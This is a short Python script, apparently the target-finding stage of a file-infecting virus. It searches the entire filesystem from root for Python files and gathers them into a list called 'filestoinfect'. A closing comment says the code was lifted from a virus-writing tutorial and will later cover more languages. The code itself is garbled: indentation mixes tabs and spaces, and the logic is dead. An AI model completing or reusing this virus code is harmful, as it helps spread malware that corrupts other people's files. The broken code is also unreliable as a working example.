import os
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))
		elif fname[-3:] == ".py":
            for line in open(path+"/"+fname):
                    break
            if 1 == 1:
				#print (path+"/")
                filestoinfect.append(path+"/"+fname)
    return filestoinfect
	
search("/")

"""
The various variables present for your sake of moduability are 
"filestoinfect" which is an array of all files that fit the 
requirement. In this case that is only in python although 
later on, support for more languages will be added.

This subsection contains code from 
https://cranklin.wordpress.com/2012/05/10/how-to-make-a-simple-computer-virus-with-python/
without their consent. But he or she is due some respect.
"""